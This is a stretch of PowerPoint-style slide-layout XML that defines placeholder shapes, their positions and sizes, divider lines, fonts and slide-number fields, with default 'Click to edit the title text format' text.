            <a:off x="685800" y="1752480"/>
            <a:ext cx="7772040" cy="43430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6" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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48"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49"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85800" y="457200"/>
            <a:ext cx="7772040" cy="45921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3"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4"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5"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57"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8"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9" name="PlaceHolder 4"/>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61"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2"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3" name="PlaceHolder 4"/>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65" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="175248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6" name="PlaceHolder 3"/>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68"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9"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0"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1" name="PlaceHolder 5"/>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73" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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4" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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5" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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6" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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7" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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8" name="PlaceHolder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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6246B6CE-7564-4090-9760-B2C84161534E}"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6"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87" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7772040" cy="4343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2B144AB-B15D-451D-91E6-1CB80834F214}"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89" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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E70DA52-A253-424B-9914-C22AE66D42A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91"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92"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1845A886-8FF0-4809-AC44-D931CD95771F}"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3"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03AE7A-BD56-41DD-8B98-F26240B57A90}"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4" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7772040" cy="45921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84C16A9-0CA6-4B1B-8569-FCB6B0DE07B4}"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96"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97"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98"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CC0617F3-1D2C-46A4-8C90-AE62399EC2DD}"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00"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01"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02" name="PlaceHolder 4"/>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E4A7CC5-93D4-410B-B11B-B675D5793FE6}"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04"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05"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06" name="PlaceHolder 4"/>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4CC70CA-9F30-4B6F-AB8A-D7ED500EDEDC}"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08" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="175248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09" name="PlaceHolder 3"/>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808145C-C5B5-4421-A9DF-08455179ECAA}"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11"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12"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13"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14" name="PlaceHolder 5"/>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C3BB83C9-2E69-42E0-858D-F01D8BD78117}"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16" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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17" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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18" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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19" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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20" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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21" name="PlaceHolder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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720A1339-E035-420C-8DD4-911D4DF21330}"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5"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26" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7772040" cy="43430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28" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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30"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31"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2"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3" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7772040" cy="45921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35"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36"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37"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39"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40"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41" name="PlaceHolder 4"/>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43"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44"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45" name="PlaceHolder 4"/>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47" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="175248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48" name="PlaceHolder 3"/>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50"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51"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52"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53" name="PlaceHolder 5"/>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55" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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56" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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57" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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58" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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59" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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60" name="PlaceHolder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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FCC6948B-4A76-45EA-833F-C6A0DD7910A9}"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7"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68" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7772040" cy="4343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F288BE5-9410-4B8F-843F-93D305C62925}"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70" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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54DA2EAC-6CAA-4F9C-A840-D2824A49F3A8}"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72"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73"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002E732-8B50-4A3E-BF01-93CEDDB6AD84}"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4"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C15B0EB4-DD92-466D-8A0D-2956B2CBD018}"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5" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7772040" cy="45921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EA48893-840B-4CC1-8630-3646971A0708}"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77"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78"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79"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50877AF-92A2-4592-8621-40443BFD31A5}"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81"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82"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83" name="PlaceHolder 4"/>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01FCB1D-4724-4FCC-B9C4-25B4ECA1FDCC}"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85"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86"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87" name="PlaceHolder 4"/>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EC2E032-4768-4E59-8BDD-99F3168BD40B}"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89" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="175248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90" name="PlaceHolder 3"/>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9CE3D11B-50E1-4151-9AFB-340ED3D32454}"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92"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93"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94"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95" name="PlaceHolder 5"/>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F78A7C1F-A551-4E1C-BCC8-2BAF1B12A413}"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197" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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98" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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199" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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00" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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01" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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02" name="PlaceHolder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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65ADDC7F-E857-4B89-99F9-9E6ACBB93692}" type="slidenum">
              <a:t>&lt;#&gt;</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="PlaceHolder 10"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>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E863419F-EC80-4B2B-9371-00A0C5B8082A}"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10"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11" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7772040" cy="4343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059FFD5-53C4-40BE-BCBE-3883B5DEDE6D}"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13" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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EF1A373F-C8FF-4FA4-A934-46D6EFA536E2}"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15"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16"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0A08A7F2-A904-4937-862E-7DA55FFA4CB2}"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7"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D9EC3B1A-7FED-43A8-90DB-AB7B7F0123E6}"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8" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7772040" cy="45921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CA207776-535A-413E-984D-0A12FB197544}"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9"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20"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21"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22"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C6E39875-3602-474E-A990-D8A0D8922776}"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24"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25"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26" name="PlaceHolder 4"/>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02D05E9-F6DC-409D-9028-E3562FAB11E4}"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7"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28"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29"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30" name="PlaceHolder 4"/>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00C107EF-2C31-4661-AA6B-34FF1AF7B7E7}"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32" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="175248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33" name="PlaceHolder 3"/>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28177877-1B1A-41B1-878D-9A8F96D63272}"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35"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36"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37"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38" name="PlaceHolder 5"/>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458ADDA6-9CBC-45BE-9FE2-E33F92BDF98B}" type="slidenum">
              <a:t>&lt;#&gt;</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="PlaceHolder 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>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40" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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41" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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42" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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43" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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44" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3313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45" name="PlaceHolder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594144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DEA3758A-E029-4C08-A58B-3640FFD6491B}" type="slidenum">
              <a:t>&lt;#&gt;</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="PlaceHolder 10"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>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7652230F-FE0C-4AEB-8FD5-7880A3EBC766}"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52"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53" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7772040" cy="4343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68C0B29E-540A-4D71-ABDA-78ADC021F7B3}"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55" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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F29E4F49-D809-4CCD-B2D0-B3497D56892C}"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56"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57"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58"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BCD0FA32-ADFA-4BAE-B3BD-8D9C21C7868C}"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9"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15C171A3-1708-468C-BB8C-C7346C6E50DC}"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60" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7772040" cy="45921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49359656-3AAD-43B3-870C-904D602BE95E}"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62"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63" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="466848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64"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4B4A4AB7-35F5-4254-B12E-95B57BBC8999}"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65"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66" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="3792600" cy="43430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67"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68" name="PlaceHolder 4"/>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9617E3C4-513D-4E46-97EC-0EB8F5DCA069}"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70"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71"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72" name="PlaceHolder 4"/>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7A985C-006C-4D95-BE87-3B930DA292EC}"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3"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74" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="175248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75" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4021200"/>
            <a:ext cx="777204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7B7AA331-358F-422A-A78F-058D91709D21}"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6"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77" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="68580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78" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4668480" y="175248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79" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="68580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80" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4668480" y="4021200"/>
            <a:ext cx="379260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515E413D-AFD1-41D6-A14B-8898E443E2A3}"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685800" y="457200"/>
            <a:ext cx="7772040" cy="990360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="282" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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83" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="331380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84" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5941440" y="175248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85" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685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86" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="331380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287" name="PlaceHolder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5941440" y="4021200"/>
            <a:ext cx="2502360" cy="2071440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>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B2EC02EE-8AC8-47C7-BAE6-B3C86EF2F33A}" type="slidenum">
              <a:t>&lt;#&gt;</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="PlaceHolder 10"/>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Line 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1600200"/>
            <a:ext cx="7772400" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25560">
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1" name="Line 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="761760" y="3124080"/>
            <a:ext cx="7772400" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25560">
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="457200"/>
            <a:ext cx="7771680" cy="990000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>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Line 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1600200"/>
            <a:ext cx="7772400" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25560">
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4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r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Click to edit the </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>title text format</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4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Line 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1600200"/>
            <a:ext cx="7772400" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="Line 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
